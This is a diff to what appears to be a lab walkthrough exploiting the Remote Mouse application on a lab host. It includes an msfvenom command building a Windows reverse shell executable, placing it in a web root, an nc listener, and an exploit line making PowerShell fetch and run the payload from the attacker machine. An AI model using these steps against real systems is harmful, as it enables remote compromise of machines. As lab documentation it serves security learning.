@@ -7,7 +7,7 @@
 # 1. nmap scan
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ nmap -p- -A 10.0.88.34
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 08:15 +08
 Nmap scan report for 10.0.88.34
@@ -130,25 +130,23 @@ The 46697.py expolits Remote Mouse to launch `calc.exe`; the line `SendString("c
 
 Generate reverse shell executable and setup web server endpoint on Kali:
 
+(Apache2 is already running with DocumentRoot at `/var/www/html`)
+
 ```console
-┌──(kali㉿kali)-[~]
-└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o reverse.exe
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7168 bytes
-Saved as: reverse.exe
-
-┌──(kali㉿kali)-[~]
-└─$ sudo python3 -m http.server 80 &> /dev/null &
-[1] 2111
+Saved as: /var/www/html/reverse.exe
 ```
 
 Open another console window on Kali to listen for connections:
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
@@ -170,7 +168,7 @@ SendString("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Obje
 Run the exploit
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ python2 46697.py 10.0.88.34
 ('SUCCESS! Process calc.exe has run on target', '10.0.88.34')
 ```
